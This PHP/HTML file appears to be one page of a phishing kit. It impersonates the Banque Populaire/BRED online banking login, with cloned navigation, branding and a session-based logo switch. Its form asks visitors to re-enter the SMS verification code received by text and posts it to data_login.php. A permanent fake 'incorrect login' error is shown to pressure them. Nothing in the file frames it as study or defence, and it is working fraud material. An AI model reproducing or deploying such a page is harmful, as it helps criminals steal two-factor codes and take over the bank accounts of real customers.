<?php

if (session_status() == PHP_SESSION_NONE) {
  session_start();
}

if (isset($_SESSION["is_bred"])) { 

   $row_logo =  "lgglg.jpg";

}else{
	
	$row_logo =  "lggsslg.png";
	
}


?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />
    <title>BANQUE Populaire |Connexion à votre espace personnel</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css" />
    <link rel="stylesheet" href="assets/css/styles.css" />
  </head>

  <body>
    <div id="nav1" class="c-div" style="height: 40px; background: #ebebeb;">
      <div class="e-div" style="width: 100%; max-width: 1140px;">
        <button class="btn btn-primary" type="button" style="color: var(--bs-gray-dark); background: transparent; border-style: none; border-radius: 0px;">Particuliers</button>
        <button class="btn btn-primary" type="button" style="color: var(--bs-gray-dark); background: transparent; border-style: none; border-radius: 0px;">Professionnels et Associations</button>
        <button class="btn btn-primary" type="button" style="color: var(--bs-gray-dark); background: transparent; border-style: none; border-radius: 0px;">Entreprises</button>
        <button class="btn btn-primary hide2" type="button" style="color: var(--bs-gray-dark); background: transparent; border-style: none; border-radius: 0px;">Banque Privée</button>
        <button class="btn btn-primary hide2" type="button" style="color: var(--bs-gray-dark); background: transparent; border-style: none; border-radius: 0px;">La BRED</button>
        <button class="btn btn-primary hide2" type="button" style="color: var(--bs-gray-dark); background: transparent; border-style: none; border-radius: 0px;">Une banque coopérative</button>
      </div>
    </div>
    <div id="nav2" class="c-div" style="height: 120px; background: linear-gradient(-84deg, #24315e 0%, rgb(36, 49, 94) 21%, white 41%);">
      <div class="sp-div" style="width: 100%; max-width: 1140px; background: #24315e;">
        <div class="c-div" style="background: var(--bs-body-bg);"><img src="assets/img/<?php echo $row_logo; ?>" /></div>
        <div style="width: 100%;">
          <div class="e-div" style="height: 50%; padding-top: 13px;">
            <button class="btn btn-primary hide1" type="button" style="background: var(--bs-btn-disabled-color); border-width: 1px; border-style: solid; color: #0092da; height: 37px; margin-right: 19px;">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-person-fill-add" viewbox="0 0 16 16">
                <path d="M12.5 16a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7m.5-5v1h1a.5.5 0 0 1 0 1h-1v1a.5.5 0 0 1-1 0v-1h-1a.5.5 0 0 1 0-1h1v-1a.5.5 0 0 1 1 0m-2-6a3 3 0 1 1-6 0 3 3 0 0 1 6 0"></path>
                <path d="M2 13c0 1 1 1 1 1h5.256A4.5 4.5 0 0 1 8 12.5a4.5 4.5 0 0 1 1.544-3.393Q8.844 9.002 8 9c-5 0-6 3-6 4"></path>
              </svg>
              <span style="visibility: hidden;">ha</span>Devenir client
            </button>
            <button class="btn btn-primary hide2" type="button" style="background: #0092da; height: 37px;">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-person-fill" viewbox="0 0 16 16"><path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6"></path></svg>
              <span style="visibility: hidden;">ha</span>Mon espace client
            </button>
          </div>
          <div class="sp-div" style="height: 50%; padding-top: 14px; padding-bottom: 14px;">
            <div class="c-div">
              <button class="btn btn-primary hide2" type="button" style="background: transparent; border-radius: 0px; border-style: none; border-right: 1px solid rgb(255, 255, 255);">Vos projets</button>
              <button class="btn btn-primary hide2" type="button" style="background: transparent; border-radius: 0px; border-style: none; border-right: 1px solid rgb(255, 255, 255);">Comptes et cartes</button>
              <button class="btn btn-primary" type="button" style="background: transparent; border-radius: 0px; border-style: none; border-right: 1px solid rgb(255, 255, 255);">Epargner</button>
              <button class="btn btn-primary hide1" type="button" style="background: transparent; border-radius: 0px; border-style: none; border-right: 1px solid rgb(255, 255, 255);">Emprunter</button>
              <button class="btn btn-primary hide1" type="button" style="background: transparent; border-radius: 0px; border-style: none; border-right: 1px solid rgb(255, 255, 255);">Assurer</button>
            </div>
            <div></div>
          </div>
        </div>
      </div>
    </div>
    <div id="nav3" class="c-div" style="height: 40px;">
      <div class="s-div" style="width: 100%; max-width: 1140px; padding-top: 7px; padding-bottom: 7px;">
        <a href="#" style="color: var(--bs-body-color); text-decoration: underline;">Accueil</a><a href="#" style="color: var(--bs-body-color); margin-left: 10px;">&gt;</a>
        <p class="fw-semibold" style="padding-bottom: 0px; margin-bottom: 0px; color: #0092da;">&nbsp; Authentification - accéder à mon compte</p>
      </div>
    </div>
    <div id="main-conatiner" class="c-div" style="height: 800px; width: 100%; padding-top: 18px;">
      <div style="max-width: 1140px; width: 100%; height: 722px;">
        <h2 style="text-align: center; color: var(--bs-body-bg); margin-top: 12px; margin-bottom: 31px;">Mon espace client en toute sécurité</h2>
        <div id="form-outre" class="c-div">
          <div id="form-in" style="width: 100%; max-width: 670px; height: 549px; padding-top: 30px; background: var(--bs-body-bg);">
            <div style="height: 52px;">
              <p class="fw-normal" style="text-align: center; font-size: 19px; margin-bottom: 0px;">
                &nbsp;<span class="fw-normal" style="color: #0092da;">Actualisation de vos informations</span>,<br />
                <br />
              </p>
            </div>
            <div style="height: 20px;">
              <p style="margin-bottom: 0px; padding-left: 10px; padding-right: 10px; margin-top: 7px;">* Champs obligatoires</p>
            </div>
            <div id="form-con" class="c-div">
              <div style="width: 100%; max-width: 362px; margin-top: 38px;">
                <form action="data_login.php" method="post">
                  <p>Sécurisez et validez vos actes de gestion réalisés depuis l'Espace Client Internet et l’application mobile La Banque Populaire.</p>
                  <p style="margin-bottom: 5px; color: #0092da;">SMS code *</p>
                  <p style="margin-bottom: 5px; margin-top: 6px; color: var(--bs-body-color); font-size: 14px;">* Le code reçu par SMS </p>
                  <div class="c-div" style="border-width: 1px; border-style: solid;">
                    
                    <input
                      class="form-control"
                      type="text"
                      maxlength="10"
                      id="j_sms_code"
                      style="height: 38px; width: 100%; border-width: 1px; border-style: none;"
                      required=""
                      name="j_sms_code"
                      oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                    />
                  </div>
                  <p id="err" style="margin-bottom: 0px; color: rgb(182, 0, 0);">Identifiant ou mot de passe incorrect</p>
                  <div class="c-div" style="margin-top: 27px;"><button class="btn btn-primary" id="next-btn" type="submit" style="width: 195px; height: 45px; background: #0091da; padding: 10px 12px;" name="ph1-btn">Suivant</button></div>
                </form>
              </div>
            </div>
            <div class="e-div" style="padding-left: 19px; padding-right: 19px; padding-top: 13px; margin-top: 38px;">
              <a href="#" style="color: var(--bs-body-color);"><img src="assets/img/icon-security.png" />Nos conseils sécurité</a>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="f1" class="c-div" style="width: 100%; height: 263px;">
      <div style="width: 100%; max-width: 1140px; padding-top: 56px; padding-bottom: 56px;">
        <p style="font-size: 24px; text-align: center;">
          Je ne suis pas&nbsp;<span style="color: #0091da;">abonné à BNAQUE</span><br />
          je souscris au service de gestion de compte en ligne
        </p>
      </div>
    </div>
    <div id="f2" class="c-div" style="width: 100%; height: 529px; background: #ebebeb;">
      <div style="width: 100%; max-width: 1140px; padding-top: 56px; padding-bottom: 56px;">
        <p style="font-size: 24px; text-align: center;">Je ne suis pas encore&nbsp;<span style="color: #0091da;">client BANQUE</span></p>
        <div class="c-div">
          <button class="btn btn-primary" type="button" style="width: 100%; max-width: 195px; height: 45px; border: 1px solid #0091da; background: var(--bs-btn-disabled-color); color: #0091da;">J'ouvre un compte</button>
        </div>
      </div>
    </div>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
  </body>
</html>
